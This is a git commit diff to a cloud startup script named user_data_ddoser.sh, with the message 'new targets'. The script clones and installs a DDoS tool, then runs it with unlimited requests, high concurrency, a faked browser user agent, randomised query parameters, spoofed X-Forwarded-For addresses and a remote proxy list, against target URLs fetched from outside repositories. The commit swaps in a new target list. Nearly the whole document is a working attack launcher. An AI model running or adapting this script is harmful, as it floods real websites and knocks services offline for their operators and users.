85b5c96aec545aed188913d733cc905ddaa9dced
romsua <kaplun89@gmail.com>
2022-03-03 11:53:21 +0200

    Update user_data_ddoser.sh
    new targets

--- user_data_ddoser.sh
+++ user_data_ddoser.sh
@@ -7,4 +7,4 @@ ulimit -n 100000
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
+python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/romsua/swine/master/swinerus.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
